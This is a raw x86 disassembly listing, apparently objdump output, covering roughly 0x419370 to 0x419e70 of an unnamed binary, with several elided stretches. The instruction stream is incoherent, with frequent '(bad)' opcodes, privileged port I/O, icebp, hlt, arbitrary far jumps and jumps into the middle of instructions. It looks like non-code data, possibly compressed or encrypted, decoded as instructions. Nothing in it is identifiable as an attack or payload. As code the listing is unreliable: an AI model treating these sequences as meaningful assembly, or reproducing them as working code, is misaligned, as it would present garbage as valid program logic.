  419370:	jle    0x419382
  419372:	in     al,dx
  419373:	call   0xdd6d381c
  419378:	outs   dx,BYTE PTR ds:[esi]
  419379:	sub    ebp,DWORD PTR [edi+0x7c7a29f7]
  41937f:	(bad)  
  419380:	and    edx,edx
  419382:	inc    esp
  419383:	xchg   esp,eax
  419384:	inc    esi
  419385:	fsubp  st(2),st
  419387:	out    dx,eax
  419388:	scas   eax,DWORD PTR es:[edi]
  419389:	je     0x41936c
  41938b:	mov    eax,0xed4294ff
  419390:	test   al,0x12
  419392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419393:	mov    edi,0xb5bf73ea
  419398:	push   cs
  419399:	dec    ebx
  41939a:	lea    eax,[eax+0x36befef0]
  4193a0:	shl    ah,0x33
  4193a3:	mov    BYTE PTR [edx+0x1ff6372b],al
  4193a9:	icebp  
  4193aa:	and    al,0x48
  4193ac:	xchg   BYTE PTR [esi+edi*4],al
  4193af:	mov    DWORD PTR [esi],edx
  4193b1:	lea    edi,[ebp-0x38]
  4193b4:	sahf   
  4193b5:	ins    DWORD PTR es:[edi],dx
  4193b6:	adc    al,0xa4
  4193b8:	mov    bh,0xf5
  4193ba:	inc    esi
  4193bb:	mov    al,ds:0xb97b7909
  4193c0:	inc    edi
  4193c1:	mov    al,ds:0x635b34a3
  4193c6:	loope  0x419359
  4193c8:	inc    esi
  4193c9:	in     eax,0x46
  4193cb:	hlt    
  4193cc:	pop    ebx
  4193cd:	add    ebp,ebx
  4193cf:	(bad)  
  4193d0:	mov    ch,0xb7
  4193d2:	dec    edx
  4193d3:	ja     0x4193d0
  4193d5:	xor    BYTE PTR [esi+0x749ed88],bh
  4193db:	push   cs
  4193dc:	cmp    BYTE PTR [edi-0x2e],bh
  4193df:	push   es
  4193e0:	enter  0x923,0x6d
  4193e4:	adc    DWORD PTR [ebx],edi
  4193e6:	jne    0x41936d
  4193e8:	push   es
  4193e9:	jle    0x41936e
  4193eb:	jnp    0x419388
  4193ed:	stos   BYTE PTR es:[edi],al
  4193ee:	adc    DWORD PTR [eax],0x47855d2c
  4193f4:	and    al,0x14
  4193f6:	imul   ecx,DWORD PTR [esi],0x20
  4193f9:	js     0x41938b
  4193fb:	mov    dl,0x5f
  4193fd:	jns    0x41938a
  4193ff:	pop    eax
  419400:	mov    al,ds:0xed7c6dd3
  419405:	icebp  
  419406:	pop    ss
  419407:	jmp    0x419390
  419409:	int    0x41
  41940b:	mov    ch,0x55
  41940d:	mov    eax,0xebbf075
  419412:	pop    ds
  419413:	loopne 0x4193e9
  419415:	mov    ebp,0xd3510adc
  41941a:	or     BYTE PTR [eax-0x59],dh
  41941d:	xlat   BYTE PTR ds:[ebx]
  41941e:	adc    BYTE PTR [ebp+0x673d034b],0x39
  419425:	mov    bh,0x1e
  419427:	in     eax,dx
  419428:	xor    al,0xd0
  41942a:	or     dh,BYTE PTR [ebx+0x6aeb7bfd]
  419430:	sbb    al,0x9d
  419432:	mov    bh,0xd9
  419434:	sub    DWORD PTR [ecx],eax
  419436:	jb     0x41943b
  419438:	pop    esp
  419439:	jmp    0xfccb:0xc0bef01a
  419440:	sbb    esp,0x0
	...
  4194b3:	add    BYTE PTR [ecx-0x7],al
  4194b6:	mov    ebx,ebx
  4194b8:	mov    ebx,0x95fb51fb
  4194bd:	fidivr WORD PTR [ebx+0x2c]
  4194c0:	cmp    esp,DWORD PTR [ebp+0x12b6b1a8]
  4194c6:	add    DWORD PTR [eax],eax
  4194c8:	test   BYTE PTR [eax],0x0
  4194cb:	add    BYTE PTR [edi+ecx*2+0x5c],ch
  4194cf:	jae    0x4194b7
  4194d1:	mov    bh,BYTE PTR [ecx-0x66611cff]
  4194d7:	ret    0x6a49
  4194da:	xor    BYTE PTR [edx],cl
  4194dc:	pop    es
  4194dd:	push   cs
  4194de:	mov    ebx,0x54e22534
  4194e3:	xchg   BYTE PTR [edi-0x41bd71d2],bl
  4194e9:	daa    
  4194ea:	add    ch,ah
  4194ec:	mov    eax,ds:0x12c43479
  4194f1:	xchg   edx,eax
  4194f2:	mov    al,0x7f
  4194f4:	mov    ds:0xecd5e53b,eax
  4194f9:	mov    bl,BYTE PTR [eax]
  4194fb:	add    esi,DWORD PTR [eax+edi*4]
  4194fe:	dec    ecx
  4194ff:	sub    al,0xba
  419501:	repz mov esi,0x27b65351
  419507:	lods   al,BYTE PTR ds:[esi]
  419508:	sar    dl,0xeb
  41950b:	fist   DWORD PTR [eax+0xcde7740]
  419511:	pusha  
  419512:	mov    esp,0xe30c793e
  419517:	stos   BYTE PTR es:[edi],al
  419518:	fld    DWORD PTR [ecx-0x11]
  41951b:	sbb    DWORD PTR [ecx+0x6],ebx
  41951e:	jns    0x41954e
  419520:	push   0xe4d2e8d
  419525:	out    0x1c,eax
  419527:	frstorw [edi]
  41952a:	inc    ecx
  41952b:	inc    ebx
  41952c:	sbb    BYTE PTR [esi],ah
  41952e:	xchg   ecx,eax
  41952f:	out    dx,al
  419530:	pop    eax
  419531:	lock mov DWORD PTR [eax+0x10],ecx
  419535:	bound  eax,QWORD PTR [ecx]
  419537:	jbe    0x4194db
  419539:	nop
  41953a:	or     al,0xb
  41953c:	mov    cl,0xe4
  41953e:	bound  ebp,QWORD PTR [ebx]
  419540:	shl    DWORD PTR [ebx+ebx*1-0xa],0x7d
  419545:	mov    dl,BYTE PTR [ecx]
  419547:	jmp    0x419521
  419549:	jmp    0xcb74:0xdbe01a5d
  419550:	lods   al,BYTE PTR ds:[esi]
  419551:	jmp    0x33ee:0xf24d73dd
  419558:	mov    cl,0x1b
  41955a:	add    BYTE PTR [edx],bh
  41955c:	(bad)  
  41955d:	in     ax,0x5f
  419560:	pop    ds
  419561:	loope  0x4195af
  419563:	and    al,0xd5
  419565:	(bad)  
  419566:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419567:	psubsw mm7,QWORD PTR [ebp+0x45b6b999]
  41956e:	and    eax,0x26d90e0b
  419573:	xchg   esi,eax
  419574:	inc    esi
  419575:	push   ebx
  419576:	imul   DWORD PTR [edx+0x70]
  419579:	nop
  41957a:	jb     0x4195e0
  41957c:	xchg   ebx,eax
  41957d:	pop    eax
  41957e:	dec    esp
  41957f:	int3   
  419580:	in     al,dx
  419581:	std    
  419582:	and    edx,DWORD PTR [ecx-0x46]
  419585:	aaa    
  419586:	les    esi,FWORD PTR [edi-0x12]
  419589:	add    eax,0x76923134
  41958e:	mov    dh,BYTE PTR [edx-0x69]
  419591:	adc    ecx,DWORD PTR [ecx+0x69de2f1f]
  419597:	fsub   QWORD PTR [ebx]
  419599:	sub    eax,0x1a68c40f
  41959e:	cwde   
  41959f:	ds (bad) 
  4195a2:	dec    edi
  4195a3:	int3   
  4195a4:	mov    ebx,0x818c65b6
  4195a9:	or     DWORD PTR [ebp+0x7c],eax
  4195ac:	adc    al,BYTE PTR [eax-0x7c]
  4195af:	fstp   TBYTE PTR [ecx+0x65495584]
  4195b5:	inc    edi
  4195b6:	mov    ah,0x46
  4195b8:	adc    ch,BYTE PTR [edi-0x1870064a]
  4195be:	or     DWORD PTR [ecx],esi
  4195c0:	cmp    al,0x75
	...
  419632:	add    BYTE PTR [eax],al
  419634:	xchg   ebx,eax
  419635:	sub    BYTE PTR [eax-0x604344c4],ah
  41963b:	scas   eax,DWORD PTR es:[edi]
  41963c:	jbe    0x4195eb
  41963e:	or     esp,DWORD PTR [eax+0x7b7c5c5f]
  419644:	lods   al,BYTE PTR ds:[esi]
  419645:	adc    eax,DWORD PTR [ecx]
  419647:	add    dh,dh
  419649:	add    BYTE PTR [eax],al
  41964b:	add    BYTE PTR [ebx-0x13],bh
  41964e:	mov    ah,0xd
  419650:	inc    edi
  419651:	pop    ecx
  419652:	ror    DWORD PTR [ebx],0x8d
  419655:	stc    
  419656:	not    dh
  419658:	std    
  419659:	scas   al,BYTE PTR es:[edi]
  41965a:	dec    ebx
  41965b:	iret   
  41965c:	xor    dl,ah
  41965e:	lock mov ds:0x9f60817c,al
  419664:	pop    ebp
  419665:	push   ss
  419666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419667:	push   DWORD PTR [edx-0x4e5b0091]
  41966d:	xchg   edx,eax
  41966e:	sbb    eax,DWORD PTR [edx+eax*2+0x1b1e39d1]
  419675:	in     al,dx
  419676:	je     0x419637
  419678:	or     bh,BYTE PTR [edx+0x648f9bd7]
  41967e:	jb     0x41960a
  419680:	xor    DWORD PTR [edi],0x44a4f597
  419686:	mov    bh,0xd5
  419688:	sahf   
  419689:	jns    0x419627
  41968b:	jo     0x4196ab
  41968d:	clc    
  41968e:	out    dx,eax
  41968f:	out    0x19,eax
  419691:	pop    ebx
  419692:	and    DWORD PTR [ebx+0x2f],0xbea7dcad
  419699:	cli    
  41969a:	pushf  
  41969b:	cli    
  41969c:	or     al,0xeb
  41969e:	and    al,0x41
  4196a0:	pop    ss
  4196a1:	adc    cl,BYTE PTR [ebx]
  4196a3:	repz jmp 0x35b:0x551695af
  4196ab:	and    BYTE PTR [eax],bh
  4196ad:	pop    eax
  4196ae:	mov    gs:0x8433e8fe,al
  4196b4:	jge    0x41969c
  4196b6:	out    0xd,al
  4196b8:	js     0x4196d5
  4196ba:	(bad)  
  4196bb:	fist   WORD PTR [ebx-0x2d]
  4196be:	sub    esi,DWORD PTR [ecx-0x36fadef1]
  4196c4:	mov    ds:0x2780e66b,al
  4196c9:	xor    BYTE PTR [eax+0x1734c68f],bl
  4196cf:	inc    ebx
  4196d0:	imul   eax,DWORD PTR [ebx+eax*4],0xef1fd5b8
  4196d7:	ins    DWORD PTR es:[edi],dx
  4196d8:	sbb    eax,0x2b653b42
  4196dd:	sub    BYTE PTR [edx-0x7e3b3cc5],bh
  4196e3:	popf   
  4196e4:	sbb    eax,0xcfa13191
  4196e9:	lds    edi,FWORD PTR [esi+0x15848ba7]
  4196ef:	inc    esp
  4196f0:	popa   
  4196f1:	ins    DWORD PTR es:[edi],dx
  4196f2:	jno    0x41973d
  4196f4:	out    0xa9,eax
  4196f6:	dec    esp
  4196f7:	dec    eax
  4196f8:	inc    esp
  4196f9:	icebp  
  4196fa:	arpl   WORD PTR [eax],si
  4196fc:	aad    0x6a
  4196fe:	cmp    eax,0xbf6fd82d
  419703:	test   BYTE PTR [esi-0x6],dl
  419706:	dec    edx
  419707:	sbb    BYTE PTR [ebp-0x1af13bba],0x6e
  41970e:	fistp  WORD PTR [edi]
  419710:	add    al,0xfe
  419712:	sbb    eax,0xa37d6c0f
  419717:	and    BYTE PTR ds:[ecx-0x47b45e79],ah
  41971e:	add    DWORD PTR [ecx+0x35753a19],ecx
  419724:	ffreep st(0)
  419726:	cmp    edi,DWORD PTR [edi]
  419728:	lods   al,BYTE PTR ds:[si]
  41972a:	or     DWORD PTR [eax],ecx
  41972c:	lods   eax,DWORD PTR ds:[esi]
  41972d:	iret   
  41972e:	mov    edx,0x1a9e5cae
  419733:	inc    eax
  419734:	sar    DWORD PTR [edx-0x59af4119],0x15
  41973b:	loope  0x41972a
  41973d:	mov    cx,WORD PTR [esi]
  419740:	pop    edi
  419741:	(bad)  
	...
  4197b2:	add    BYTE PTR [eax],al
  4197b4:	xchg   esp,eax
  4197b5:	enter  0x4337,0x7f
  4197b9:	push   esp
  4197bb:	fist   WORD PTR [ecx+0xc27cbe9]
  4197c1:	int    0xb5
  4197c3:	xchg   ebp,eax
  4197c4:	mov    ds:0xf6000114,al
  4197c9:	add    BYTE PTR [eax],al
  4197cb:	add    BYTE PTR [edi+0x33db2f0b],dl
  4197d1:	(bad)  
  4197d3:	scas   al,BYTE PTR es:[edi]
  4197d4:	push   cs
  4197d5:	push   edx
  4197d6:	adc    eax,0x356223e2
  4197db:	outs   dx,DWORD PTR ds:[esi]
  4197dc:	dec    ebp
  4197dd:	add    al,BYTE PTR [esi]
  4197df:	mov    dl,0xa6
  4197e1:	repnz inc eax
  4197e3:	pop    ds
  4197e4:	dec    eax
  4197e5:	mov    cl,0x48
  4197e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197e8:	push   0xb9fa308c
  4197ed:	jge    0x419780
  4197ef:	retf   0xb95a
  4197f2:	push   es
  4197f3:	sub    al,al
  4197f5:	cli    
  4197f6:	jg     0x419785
  4197f8:	imul   esp,edx,0x48
  4197fb:	cmp    cl,BYTE PTR [edi-0x1818caae]
  419801:	dec    esp
  419802:	ins    DWORD PTR es:[edi],dx
  419803:	loopne 0x419803
  419805:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419806:	or     DWORD PTR [edi+eax*4],ecx
  419809:	push   ss
  41980a:	or     bl,ch
  41980c:	push   eax
  41980d:	mov    esi,0xb0821709
  419812:	mov    eax,?
  419814:	and    al,0x53
  419816:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419817:	push   es
  419818:	pushf  
  419819:	cmp    eax,DWORD PTR [edx]
  41981b:	loopne 0x4197cc
  41981d:	repnz daa 
  41981f:	aaa    
  419820:	rol    bl,0x46
  419823:	and    BYTE PTR [eax],0x14
  419826:	pop    ecx
  419827:	push   ds
  419828:	xor    DWORD PTR [edi],edi
  41982a:	jo     0x4197d5
  41982c:	bound  esi,QWORD PTR [esi+ebx*1+0x152b1c61]
  419833:	lock or edx,DWORD PTR [esi-0x49]
  419837:	cld    
  419838:	sbb    al,0x8b
  41983a:	in     al,0xa9
  41983c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41983d:	mov    ds:0xcc348bda,eax
  419842:	cmp    bh,dl
  419844:	adc    al,0xca
  419846:	jnp    0x419896
  419848:	ss push ebp
  41984a:	nop
  41984b:	pusha  
  41984c:	leave  
  41984d:	jmp    0x940c0bb7
  419852:	ins    BYTE PTR es:[edi],dx
  419853:	pop    ds
  419854:	mov    edi,0x50124cec
  419859:	mov    dh,0x64
  41985b:	loop   0x419824
  41985d:	mov    ds:0x6792c7f6,eax
  419862:	hlt    
  419863:	jno    0x4198cc
  419865:	int3   
  419866:	push   ss
  419867:	(bad)  
  419868:	adc    al,0xcd
  41986a:	xchg   BYTE PTR [esi],dh
  41986c:	out    0x71,eax
  41986e:	push   0x8497f630
  419873:	push   0x7f886e61
  419878:	in     al,0x7b
  41987a:	fist   WORD PTR [esi-0x69]
  41987d:	mov    cl,0x7
  41987f:	mov    ebp,0x1ed2ef89
  419884:	dec    edx
  419885:	std    
  419886:	ja     0x4198b2
  419888:	mov    WORD PTR [ecx+edi*2],ss
  41988b:	dec    ebx
  41988c:	stos   BYTE PTR es:[edi],al
  41988d:	fisub  DWORD PTR [esp+edi*2]
  419890:	call   0x31b2693b
  419895:	or     eax,0x77948887
  41989a:	jmp    0x41989e
  41989c:	mov    dl,0xad
  41989e:	push   0x2c9cf0e2
  4198a3:	mov    esi,0xcacef43d
  4198a8:	sub    BYTE PTR [edi*4-0x54a9df01],cl
  4198af:	lock popa 
  4198b1:	hlt    
  4198b2:	ins    DWORD PTR es:[edi],dx
  4198b3:	das    
  4198b4:	sub    al,0x8b
  4198b6:	jnp    0x4198df
  4198b8:	sub    eax,ecx
  4198ba:	pushf  
  4198bb:	push   eax
  4198bc:	add    BYTE PTR [eax+eax*4],ch
  4198bf:	clc    
  4198c0:	jle    0x4198b4
	...
  419932:	add    BYTE PTR [eax],al
  419934:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  41993a:	into   
  41993b:	fwait
  41993c:	test   BYTE PTR [ecx-0x28],0x94
  419940:	xchg   bl,cl
  419942:	mov    ch,0xd4
  419944:	cwde   
  419945:	adc    eax,0xf60001
  41994a:	add    BYTE PTR [eax],al
  41994c:	(bad)  
  41994d:	mov    ebx,0xb4625786
  419952:	xor    BYTE PTR [edx*8+0x39441da1],dh
  419959:	jge    0x4198fe
  41995b:	cmp    bl,BYTE PTR [edx-0x6a]
  41995e:	daa    
  41995f:	call   0x9c5:0x966e6522
  419966:	cmc    
  419967:	cld    
  419968:	loopne 0x41993f
  41996a:	fld    QWORD PTR [ebp-0x36420e19]
  419970:	sub    esi,esp
  419972:	dec    BYTE PTR [ebx*4+0x17c854fd]
  419979:	daa    
  41997a:	xchg   esi,eax
  41997b:	ins    DWORD PTR es:[edi],dx
  41997c:	xchg   edx,eax
  41997d:	push   ebp
  41997e:	rcl    BYTE PTR ds:0x5bda4812,0x75
  419985:	shld   DWORD PTR [esi+0x467cb066],esp,0x38
  41998d:	or     ebx,DWORD PTR [edi]
  41998f:	xchg   BYTE PTR [esi+0x6b92e644],ch
  419995:	and    bl,BYTE PTR [ebx]
  419997:	into   
  419998:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419999:	sub    dl,al
  41999b:	ins    DWORD PTR es:[edi],dx
  41999c:	mov    ds:0x7fd2f2e3,eax
  4199a1:	and    esi,edi
  4199a3:	add    DWORD PTR gs:[ecx+0x74b34be9],0x4b
  4199ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199ac:	mov    al,0xb0
  4199ae:	and    eax,0xfa2309b
  4199b3:	dec    ecx
  4199b4:	fisttp QWORD PTR [ebx-0x10]
  4199b7:	fisubr DWORD PTR [edi+0x2be8a507]
  4199bd:	add    BYTE PTR [ebp+0x5d],bh
  4199c0:	enter  0xf25c,0x22
  4199c4:	sub    DWORD PTR [ebx-0x9],esp
  4199c7:	and    ch,BYTE PTR [ebp+0x1b821efb]
  4199cd:	inc    sp
  4199cf:	out    0x33,eax
  4199d1:	adc    DWORD PTR [eax-0x80],esi
  4199d4:	retf   
  4199d5:	in     al,dx
  4199d6:	clc    
  4199d7:	retf   0xf14c
  4199da:	cmp    esp,DWORD PTR [ebp+0x7b]
  4199dd:	pop    es
  4199de:	add    DWORD PTR [edi-0x3cd458dd],edi
  4199e4:	lahf   
  4199e5:	fst    DWORD PTR [ebx+0x20]
  4199e8:	or     ebp,DWORD PTR [ecx+0xc]
  4199eb:	jle    0x41998b
  4199ed:	adc    esp,DWORD PTR [edx-0x4c]
  4199f0:	adc    al,0xfd
  4199f2:	in     al,dx
  4199f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199f4:	popa   
  4199f5:	or     BYTE PTR ds:0x9b02efa3,ch
  4199fb:	es dec ecx
  4199fd:	push   cs
  4199fe:	cmp    eax,0xe017bb1b
  419a03:	rcl    BYTE PTR [ecx-0x695ea265],0x4a
  419a0a:	jmp    0xc0dcf1c
  419a0f:	cmc    
  419a10:	aas    
  419a11:	or     cl,BYTE PTR [esi+0x17]
  419a14:	test   DWORD PTR [esi+0x43],ebp
  419a17:	enter  0x97a5,0x81
  419a1b:	sti    
  419a1c:	mov    cl,0x65
  419a1e:	mov    bp,0x899e
  419a22:	loop   0x419a76
  419a24:	(bad)
  419a27:	dec    eax
  419a28:	add    BYTE PTR [ecx],dh
  419a2a:	jne    0x419a57
  419a2c:	neg    esi
  419a2e:	jg     0x419a61
  419a30:	repz inc esp
  419a32:	adc    DWORD PTR [edi+0x5027df42],0xf695d887
  419a3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a3d:	enter  0xd011,0x50
  419a41:	mov    bh,0x0
	...
  419ab3:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  419ab7:	xor    ch,bh
  419ab9:	mov    dh,0xff
  419abb:	pop    edi
  419abc:	mov    ebp,0x32357b47
  419ac1:	std    
  419ac2:	mov    ds:0x1168e7b,eax
  419ac7:	add    dh,dh
  419ac9:	add    BYTE PTR [eax],al
  419acb:	add    ah,al
  419acd:	rcr    dh,0xbf
  419ad0:	jle    0x419b0d
  419ad2:	push   es
  419ad3:	add    al,0x50
  419ad5:	stos   BYTE PTR es:[edi],al
  419ad6:	lea    esi,[edx+ecx*4-0x46d9a443]
  419add:	call   0x6e38d61c
  419ae2:	adc    al,0xc2
  419ae4:	xchg   ecx,eax
  419ae5:	jp     0x419ad3
  419ae7:	mov    cl,0xf0
  419ae9:	xchg   DWORD PTR [ebx+0x7cbcca2f],ebp
  419aef:	xchg   ebp,eax
  419af0:	lahf   
  419af1:	pop    esi
  419af2:	inc    ebx
  419af3:	push   ss
  419af4:	ja     0x419aa6
  419af6:	xor    ecx,DWORD PTR [ecx-0x22]
  419af9:	push   esp
  419afa:	fidiv  DWORD PTR [ebp-0x3c]
  419afd:	data16 mov BYTE PTR [esi],bh
  419b00:	arpl   WORD PTR ds:0xb04d5f3c,di
  419b06:	fldenv [ebp-0x2e]
  419b09:	pusha  
  419b0a:	cmp    eax,0x7b8b519f
  419b0f:	and    BYTE PTR [ecx],dl
  419b11:	adc    DWORD PTR [edi-0x76c73a6d],ecx
  419b17:	ja     0x419b21
  419b19:	sbb    al,0x4b
  419b1b:	mov    dl,0xe1
  419b1d:	mov    bl,BYTE PTR [edi+0x79cb3be]
  419b23:	(bad)
  419b26:	(bad)  
  419b27:	sbb    al,0x36
  419b29:	and    BYTE PTR [ecx],cl
  419b2b:	sbb    eax,0x79410bb7
  419b30:	or     eax,0xe114b501
  419b35:	cli    
  419b36:	loope  0x419ae5
  419b38:	cmp    al,dh
  419b3a:	test   DWORD PTR [esi+0x6c],ebp
  419b3d:	lea    edi,[eax]
  419b3f:	jp     0x419b40
  419b41:	jns    0x419ad6
  419b43:	mov    edi,0xe136afd0
  419b48:	stc    
  419b49:	addr16 sub edi,esp
  419b4c:	in     eax,0xe1
  419b4e:	mov    ecx,0xcd5164c5
  419b53:	retf   0x627b
  419b56:	push   edx
  419b57:	cmp    ebx,DWORD PTR [ebp+0x628a5b32]
  419b5d:	push   edx
  419b5e:	add    eax,0x7d7ca06a
  419b63:	and    al,0xf8
  419b65:	or     BYTE PTR [ebp+0x5c],dl
  419b68:	add    ch,BYTE PTR ds:0xaa781387
  419b6e:	push   ecx
  419b6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b70:	sbb    al,0x54
  419b72:	push   ss
  419b73:	mov    bl,0xf4
  419b75:	(bad)  [ebp+0x74]
  419b78:	push   esp
  419b79:	push   0x78
  419b7b:	ror    DWORD PTR [esi+0x34],0x9b
  419b7f:	add    eax,0xa0d78cc1
  419b84:	fs std 
  419b86:	pop    eax
  419b87:	sub    al,0x13
  419b89:	jl     0x419bcd
  419b8b:	inc    edx
  419b8c:	jae    0x419b55
  419b8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b8f:	mov    esp,0xaf68968
  419b94:	mov    esi,0x22753f5a
  419b99:	mov    bh,0xd0
  419b9b:	fadd   QWORD PTR [ebp-0x25ce2297]
  419ba1:	mov    ah,0xcb
  419ba3:	jmp    0x419ba0
  419ba5:	push   0x36
  419ba7:	inc    ecx
  419ba8:	sahf   
  419ba9:	aad    0x2f
  419bab:	pop    edi
  419bac:	popf   
  419bad:	jo     0x419b4b
  419baf:	mov    al,0xd2
  419bb1:	rdtsc  
  419bb3:	pop    esp
  419bb4:	int    0x5a
  419bb6:	clc    
  419bb7:	sub    al,0x5d
  419bb9:	pop    edx
  419bba:	sbb    bh,dh
  419bbc:	addr16 xchg ebp,eax
  419bbe:	imul   edx,DWORD PTR [edi],0x12
  419bc1:	pop    esi
	...
  419c32:	add    BYTE PTR [eax],al
  419c34:	sti    
  419c35:	inc    edx
  419c36:	out    dx,al
  419c37:	aas    
  419c38:	(bad)  
  419c39:	mov    edi,0x157c6fb
  419c3e:	sub    esi,0xffffffc0
  419c41:	repnz ins DWORD PTR es:[edi],dx
  419c43:	dec    ebp
  419c44:	test   BYTE PTR [edi],dl
  419c46:	add    DWORD PTR [eax],eax
  419c48:	test   BYTE PTR [eax],0x0
  419c4b:	add    BYTE PTR [eax-0x3652260c],dh
  419c51:	xor    al,0x34
  419c53:	mov    cl,BYTE PTR [edx]
  419c55:	lods   eax,DWORD PTR ds:[esi]
  419c56:	imul   edi,DWORD PTR [ebp-0x16],0x9ba61fe2
  419c5d:	and    al,cl
  419c5f:	aad    0x9b
  419c61:	ss ja  0x419c7a
  419c64:	mov    al,dh
  419c66:	test   al,0xdb
  419c68:	sbb    cl,BYTE PTR [edx]
  419c6a:	call   0x17aab6b2
  419c6f:	and    DWORD PTR [ebp+0x6b],eax
  419c72:	and    al,0xd
  419c74:	jnp    0x419c0b
  419c76:	mul    DWORD PTR [edx+edi*4-0x66]
  419c7a:	fwait
  419c7b:	retf   0xc44b
  419c7e:	push   eax
  419c7f:	mov    ds:0xb896273,al
  419c84:	mov    esp,0xf40e6c01
  419c89:	push   ecx
  419c8a:	dec    DWORD PTR [esi+0x53]
  419c8d:	jnp    0x419cc1
  419c8f:	outs   dx,DWORD PTR ds:[esi]
  419c90:	dec    ebx
  419c91:	aam    0x9c
  419c93:	test   dl,cl
  419c95:	mov    esp,esp
  419c97:	test   al,0xec
  419c99:	lds    esp,FWORD PTR [edx+0x53]
  419c9c:	sub    BYTE PTR [ebp+0x2c0a8b0f],bh
  419ca2:	(bad)  
  419ca3:	jmp    0xfd:0xf2bfa95d
  419caa:	or     ah,bh
  419cac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419cad:	and    eax,esp
  419caf:	dec    ebx
  419cb0:	es in  eax,0x23
  419cb3:	sub    al,0x8c
  419cb5:	mov    ecx,0x7e6798c8
  419cba:	or     al,BYTE PTR [edx+0x1f34063]
  419cc0:	jo     0x419ca6
  419cc2:	addr16 mov ebp,0xc287dbb5
  419cc8:	or     eax,0xe6798b
  419ccd:	hlt    
  419cce:	mov    eax,ds:0x81074087
  419cd3:	xor    DWORD PTR [ecx-0x666a7ee],ebp
  419cd9:	dec    edi
  419cda:	mov    BYTE PTR [edx],0x68
  419cdd:	push   es
  419cde:	sti    
  419cdf:	je     0x419c64
  419ce1:	mov    DWORD PTR [eax-0xe],ebp
  419ce4:	xchg   ebp,eax
  419ce5:	push   0xd181b969
  419cea:	fsub   QWORD PTR [esi-0x14]
  419ced:	std    
  419cee:	sbb    eax,0x7d2b8ab4
  419cf3:	sahf   
  419cf4:	(bad)  
  419cf5:	cld    
  419cf6:	enter  0x6cbd,0xf0
  419cfa:	jmp    0x419d42
  419cfc:	cmp    al,dh
  419cfe:	stos   DWORD PTR es:[edi],eax
  419cff:	or     al,0xe4
  419d01:	dec    esi
  419d02:	sub    DWORD PTR [esi+eax*4+0x57],eax
  419d06:	das    
  419d07:	arpl   WORD PTR [ebp+0x29d2d09e],dx
  419d0d:	adc    al,0xe8
  419d0f:	mov    eax,0x628435d2
  419d14:	mov    eax,ds:0xe1e649d
  419d19:	pushf  
  419d1a:	popa   
  419d1b:	test   al,0xb0
  419d1d:	push   DWORD PTR [ecx-0x59]
  419d20:	cmp    eax,0xb49a2be3
  419d25:	xchg   edx,eax
  419d26:	call   0xce19f649
  419d2b:	xor    BYTE PTR [edi],ah
  419d2d:	push   cs
  419d2e:	pushf  
  419d2f:	jmp    0x3b98ff75
  419d34:	test   BYTE PTR [ebx],dl
  419d36:	sbb    BYTE PTR [edi+0x34b4ccdf],bl
  419d3c:	add    BYTE PTR ds:0x90b2077f,ch
	...
  419db2:	add    BYTE PTR [eax],al
  419db4:	push   cs
  419db5:	bnd call 0xde7c99eb
  419dbb:	(bad)  
  419dbc:	jp     0x419e27
  419dbe:	xchg   edi,eax
  419dbf:	inc    esp
  419dc0:	adc    DWORD PTR [ecx+0x187a7756],esi
  419dc6:	add    DWORD PTR [eax],eax
  419dc8:	test   BYTE PTR [eax],0x0
  419dcb:	add    BYTE PTR [edi-0x7c],ah
  419dce:	and    al,0x53
  419dd0:	jmp    0x80c:0xd8017730
  419dd7:	test   eax,0xc6668fcc
  419ddc:	fst    QWORD PTR [ebp-0x4d70ba21]
  419de2:	adc    al,0x9
  419de4:	iret   
  419de5:	cwde   
  419de6:	in     eax,0x1e
  419de8:	jmp    0x419e37
  419dea:	les    ebx,FWORD PTR [ecx+0x33]
  419ded:	mov    ebp,0xe3b674d7
  419df2:	jnp    0x419e6e
  419df4:	fldcw  WORD PTR [edx-0x21244d63]
  419dfa:	dec    edi
  419dfb:	imul   ecx,DWORD PTR [edx+0x7a],0x6e
  419dff:	push   ebx
  419e00:	sub    eax,DWORD PTR [esi+ecx*1]
  419e03:	sub    BYTE PTR [eax+esi*4-0x13],al
  419e07:	mov    ds:0x4b576cb2,eax
  419e0c:	repnz and al,0xf8
  419e0f:	imul   esp,DWORD PTR [edx],0xa
  419e12:	cmc    
  419e13:	sar    BYTE PTR [ebp+0x3a5f4659],0x70
  419e1a:	pop    esi
  419e1b:	inc    ecx
  419e1d:	add    eax,edi
  419e1f:	jmp    0x9ba3:0xa301005c
  419e26:	hlt    
  419e27:	test   DWORD PTR [eax-0x56e247e],0xb3ddfd9
  419e31:	in     eax,0x5
  419e33:	xor    ebx,DWORD PTR ds:0xc2f005a7
  419e39:	pushf  
  419e3a:	outs   dx,DWORD PTR ds:[esi]
  419e3b:	cli    
  419e3c:	push   eax
  419e3d:	mov    ah,0xf5
  419e3f:	cdq    
  419e40:	loop   0x419dda
  419e42:	jo     0x419e2c
  419e44:	popf   
  419e45:	int3   
  419e46:	inc    esi
  419e47:	in     al,dx
  419e48:	and    DWORD PTR [edi+edi*2+0x39d43ced],edi
  419e4f:	cmp    DWORD PTR [ecx+0x4c],ebp
  419e52:	xchg   DWORD PTR [eax],ebx
  419e54:	rcr    DWORD PTR [edi+0x33],0xaf
  419e58:	push   eax
  419e59:	in     al,dx
  419e5a:	test   eax,0xda6fa85c
  419e5f:	push   edi
  419e60:	push   es
  419e61:	mov    DWORD PTR [eax-0x15],0xb21c3cea
  419e68:	iret   
  419e69:	pop    ecx
  419e6a:	pushf  
  419e6b:	xlat   BYTE PTR ds:[ebx]
  419e6c:	aas    
  419e6d:	fldcw  WORD PTR [edi-0x21]
  419e70:	sub    DWORD PTR [ecx+0x64],ecx
